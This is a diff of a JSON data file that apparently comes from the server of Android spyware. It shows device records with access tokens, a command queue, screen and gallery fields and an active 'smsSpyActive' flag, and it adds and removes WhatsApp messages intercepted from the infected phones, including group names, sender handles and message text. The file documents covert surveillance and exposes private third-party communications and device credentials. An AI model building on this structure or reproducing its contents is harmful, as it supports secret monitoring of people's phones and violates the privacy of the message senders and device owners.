@@ -4,7 +4,7 @@
     "deviceName": "HP-AIM-7C2F",
     "ownerUsername": "51a6566b-13c6-424c-8f68-421c28fdc099",
     "token": "5c459e8712f2a7ee2b4192ea89156763",
-    "lastSeen": 1775040958078,
+    "lastSeen": 1775040961086,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-01T10:32:40.020Z",
@@ -20,6 +20,14 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "‎main botwiee bersama (12224 pesan): ~ Bot",
+        "content": "💟 Stiker",
+        "time": "01/04 18:56",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775040963464
+      },
       {
         "appName": "WhatsApp",
         "sender": "‎main botwiee bersama (12223 pesan): ~ Tipooo",
@@ -4011,14 +4019,6 @@
         "time": "01/04 18:40",
         "pkg": "com.whatsapp",
         "receivedAt": 1775040018864
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎main botwiee bersama (12065 pesan): ~ sʏʀɪɴɴ",
-        "content": ".brathd ap?",
-        "time": "01/04 18:40",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1775040018776
       }
     ],
     "galleryPhotos": [],
@@ -4049,7 +4049,7 @@
     "deviceName": "HP-AIM-22BD",
     "ownerUsername": "51a6566b-13c6-424c-8f68-421c28fdc099",
     "token": "ee7716168abf03ae6470b12578967076",
-    "lastSeen": 1775040958803,
+    "lastSeen": 1775040961841,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-01T10:33:59.233Z",
@@ -4065,6 +4065,22 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "‎main botwiee bersama (12224 pesan): ~ Bot",
+        "content": "💟 Stiker",
+        "time": "01/04 18:56",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775040963496
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "‎main botwiee bersama (12223 pesan): ~ Tipooo",
+        "content": "Jenis pesan tidak diketahui",
+        "time": "01/04 18:56",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775040960679
+      },
       {
         "appName": "WhatsApp",
         "sender": "muh jusmin",
@@ -8048,22 +8064,6 @@
         "time": "01/04 18:40",
         "pkg": "com.whatsapp",
         "receivedAt": 1775040018834
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎main botwiee bersama (12065 pesan): ~ sʏʀɪɴɴ",
-        "content": ".brathd ap?",
-        "time": "01/04 18:40",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1775040018761
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎GB ISIAN ZAYN X OWN [2] (1899 pesan): ~ mfthlirfan",
-        "content": "22 8 nvmtps fpt no pc no mobi no makro hp only",
-        "time": "01/04 18:40",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1775040017006
       }
     ],
     "galleryPhotos": [],
